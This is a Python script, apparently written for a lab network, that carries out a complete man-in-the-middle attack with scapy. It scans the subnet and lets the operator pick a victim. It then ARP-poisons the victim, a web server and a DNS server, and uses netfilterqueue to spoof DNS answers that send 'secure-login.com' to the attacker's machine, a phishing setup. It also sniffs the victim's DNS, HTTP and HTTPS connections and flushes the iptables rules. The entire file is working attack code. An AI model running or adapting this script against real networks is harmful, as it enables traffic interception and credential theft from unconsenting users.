import scapy.all as scapy
import time
import threading
import netfilterqueue
import subprocess

# Network variables
DNS_SERVER_IP = "192.168.50.30" # IP of the targeted DNS server
WEB_SERVER_IP = "192.168.50.40" # IP of the targeted webserver
ATTACKER_IP = "192.168.50.10"  # IP of the machine running the attack
INTERFACE = "eth1" # Network interface used in scapy commands
NETWORK_RANGE = "192.168.50.0/24" # Subnet of the lab environment

# DNS spoofing configuration
SPOOF_DOMAIN = "secure-login.com" # Domain that gets spoofed
SPOOF_TO_IP = ATTACKER_IP  # IP where victim gets redirected through DNS spoofing

# Get mac address of the victim
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]
    return answered_list[0][1].hwsrc

def spoof(VICTIM_IP, spoof_ip):
    mac_target = get_mac(VICTIM_IP)
    packet = scapy.ARP(op=2, pdst=VICTIM_IP, hwdst=mac_target, psrc=spoof_ip)
    ether_frame = scapy.Ether(dst=mac_target)
    scapy.sendp(ether_frame / packet, verbose=False, iface=INTERFACE)

def restore(destination_ip, source_ip):
    destination_ip_mac = get_mac(destination_ip)
    source_ip_mac = get_mac(source_ip)
    ether_frame = scapy.Ether(dst=destination_ip_mac)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_ip_mac, psrc=source_ip, hwsrc=source_ip_mac)
    scapy.sendp(ether_frame / packet, count=5, verbose=False, iface=INTERFACE)

def setup_iptables():
    # Flush existing rules
    cleanup_iptables()
    
    # Forward DNS queries (UDP port 53) to que 0
    subprocess.run(["iptables", "-I", "FORWARD", "-p", "udp", "--dport", "53", "-j", "NFQUEUE", "--queue-num", "0"], 
                   capture_output=True)

    print("Iptables rules configured")

# Flush IP table rules
def cleanup_iptables():
    subprocess.run(["iptables", "--flush"], capture_output=True)

def process_packet(packet):
    try:
        # Convert packet to scapy packet
        scapy_packet = scapy.IP(packet.get_payload())
        
        # Check if packet is DNS query (Port=   53)
        if scapy_packet.haslayer(scapy.UDP) and scapy_packet[scapy.UDP].dport == 53:
            if scapy_packet.haslayer(scapy.DNSQR):

                # Exrtact queried site name  
                dns_query = scapy_packet[scapy.DNSQR]
                query_name = dns_query.qname.decode('utf-8', errors='ignore')
                print(f"DNS Query detected: {query_name}")
                
                # Check if the query is for the target domain
                if SPOOF_DOMAIN in query_name:
                    print(f"Spoofing DNS response for {SPOOF_DOMAIN} -> {SPOOF_TO_IP}")
                    
                    # Create a spoofed DNS response
                    spoofed_response = create_spoofed_dns_response(scapy_packet)
                    
                    # Set the payload to the created spoofed response
                    if spoofed_response:
                        packet.set_payload(bytes(spoofed_response))
                        
    except Exception as e:
        print(f"Error in packet processing: {e}")
    
    packet.accept()

def create_spoofed_dns_response(original_packet):
    try:
        # Extract layers from package
        ip_layer = original_packet[scapy.IP]
        udp_layer = original_packet[scapy.UDP]
        dns_layer = original_packet[scapy.DNS]
        
        # Swap source and destination IP for the response
        spoofed_ip = scapy.IP(
            src=ip_layer.dst,  # Original IP destination -> IP source
            dst=ip_layer.src   # Original IP source -> IP destination
        )
        
        # Swap source and destination port for the response
        spoofed_udp = scapy.UDP(
            sport=udp_layer.dport, # Original source port -> destination port
            dport=udp_layer.sport  # Original destination port -> source port
        )
        
        # Create DNS response
        spoofed_dns = scapy.DNS(
            id=dns_layer.id, # copy id
            qr=1,           # Response 
            aa=0,           # Not authoritative 
            ra=1,           # Recursion available
            qd=dns_layer.qd,  # Copy the query
            an=scapy.DNSRR(
                rrname=dns_layer.qd.qname, # domain name requested, copied from query
                type="A", # IPv4 address
                rclass="IN", # internet class
                ttl=300, # time to live = 5 minutes
                rdata=SPOOF_TO_IP # actual IPv4 answer 
            )
        )
        
        return spoofed_ip / spoofed_udp / spoofed_dns
        
    except Exception as e:
        print(f"Error creating spoofed response: {e}")
        return None
    
def start_dns_spoofing():
    print(f"Started DNS spoofing, redirecting {SPOOF_DOMAIN} to {SPOOF_TO_IP}")
    
    setup_iptables()
    
    try:
        # Create netfilter queue object
        queue = netfilterqueue.NetfilterQueue()

        # Listen to queue 0, call process packet for every that arrives in the queue
        queue.bind(0, process_packet)
        
        # Start processing packets
        queue.run()
        
    except KeyboardInterrupt:
        print("\nStopping DNS spoofing...")
        queue.unbind()
        cleanup_iptables()
        
# thread for sniffing packets
def sniff_outgoing_packets(victim_ip):
    def packet_callback(packet):

        # Check for DNS queries from victim
        if packet.haslayer(scapy.DNSQR):
            dns_query = packet[scapy.DNSQR]
            print(f"[DNS Query from {victim_ip}] to {dns_query.qname.decode()}")

        # Check for HTTP packets from victim
        elif packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == 80:
            print(f"[HTTP from {victim_ip}] to {packet[scapy.IP].dst}")

        # Check for HTTPS packets from victim
        elif packet.haslayer(scapy.TCP) and packet[scapy.TCP].dport == 443:
            print(f"[HTTPS from {victim_ip}] to {packet[scapy.IP].dst}")
    
    print(f"Starting to sniff outgoing packets from {victim_ip}...")

    # Start sniffing and call function on every packet recieved
    scapy.sniff(prn=packet_callback, filter=f"ip src {victim_ip}", store=0, iface=INTERFACE)

def run_arp_poisoning(victim, server=WEB_SERVER_IP):
     # Start DNS spoofing thread
    dns_thread = threading.Thread(target=start_dns_spoofing, daemon=True)
    dns_thread.start()
    
    # Start sniffing thread
    sniff_thread = threading.Thread(target=sniff_outgoing_packets, args=(victim,), daemon=True)
    sniff_thread.start()

    sent_packets_count = 0
    print(f"Starting ARP poisoning: {victim} <-> {server}")
    try:
        while True:
            spoof(victim, server)
            spoof(server, victim)
            spoof(victim,DNS_SERVER_IP)
            spoof(DNS_SERVER_IP,victim)
            sent_packets_count = sent_packets_count + 2
            #print(f"\rPackets Sent: {sent_packets_count}", end="")
            
            time.sleep(2)

    except KeyboardInterrupt:
        restore(victim, server)
        restore(server, victim)
        restore(victim,DNS_SERVER_IP)
        restore(DNS_SERVER_IP,victim)
        cleanup_iptables()
        print("\nAttack stopped and ARP tables restored")

def main():
    request = scapy.ARP(pdst=NETWORK_RANGE)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = ether / request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=INTERFACE)[0]

    hosts = []

    for sent, received in answered_list:
        hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
    print("Available devices in the network:")
    print("IP\t\t\tMAC Address\n-----------------------------------------")
    for host in hosts:
        print(f"{host['ip']}\t\t{host['mac']}")
    request_input = input("Select the target IP address: ").strip()
    if request_input in [host['ip'] for host in hosts]:    
        run_arp_poisoning(request_input)
    else: print("\nInvalid target")

if __name__ == "__main__":
    main()